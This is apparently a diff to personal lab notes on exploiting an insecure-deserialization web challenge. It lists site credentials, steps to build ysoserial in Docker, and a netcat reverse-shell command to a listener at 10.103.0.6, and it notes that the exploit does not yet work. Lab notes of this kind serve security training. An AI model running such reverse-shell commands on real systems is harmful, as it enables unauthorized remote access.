@@ -9,7 +9,7 @@
 ## Steps
 
 
-**1 Analyze insecure/serialization website**
+**1user  Analyze insecure/serialization website**
 Insecure/deserialization credentials
 thomas
 mypass22
@@ -22,10 +22,26 @@ Cookie values:
 
 
 **2 exploit**
-Reverse shell credentials
-username: hacker
-password: Lxs0yj4tefam
+Running ysoserial reverse shell
+1. get ysoserial from github
+```
+git clone https://github.com/frohoff/ysoserial.git
+cd ysoserial
+```
+2. fix dockerfile according to: https://github.com/frohoff/ysoserial/pull/193
+3. run docker
+```
+docker build -t ysoserial .
+docker run ysoserial --help
+```
 
+
+**Reverse shell **
+credentials
+- username: hacker
+- password: 47jOydzxcp0u
+10.103.0.6.  Port 1337 or 4242 
+`nc 10.103.0.6 1337 -e /bin/sh`
 <span style="color:red">creating exploit not working.. java installation problem
     
     TODO check messages: docker file has to be adapted manually 
